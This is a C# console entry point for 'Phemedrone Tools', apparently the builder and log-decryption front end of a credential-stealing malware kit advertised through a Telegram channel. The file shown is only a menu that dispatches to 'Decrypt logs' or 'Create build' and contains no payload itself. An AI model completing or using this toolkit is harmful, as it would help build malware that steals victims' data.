using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Text;
using Phemedrone.Tools.Interface;
using Phemedrone.Tools.Interface.Settings;
using Phemedrone.Tools.Updater;

namespace Phemedrone.Tools
{
    internal class Program
    {
        public static void Main()
        {
            Console.CursorVisible = false;
            Console.OutputEncoding = Encoding.Unicode;
            Console.InputEncoding = Encoding.Unicode;
            Console.Title = $"Phemedrone Tools | t.me/freakcodingspot | Version: {Constants.BuilderVersion}";
            
            var option = new OptionSelection<string>(new OptionSelectionSettings<string>
            {
                Title = "Select mode",
                Description = "Select whether you want to decrypt logs or to create a new build",
                Options = new List<string>
                {
                    "Decrypt logs",
                    "Create build"
                }
            }).Draw();

            switch (option)
            {
                case "Decrypt logs":
                    LogDecryption.Phase.Begin();
                    break;
                case "Create build":
                    Builder.Phase.Begin();
                    break;
            }
        }
    }
}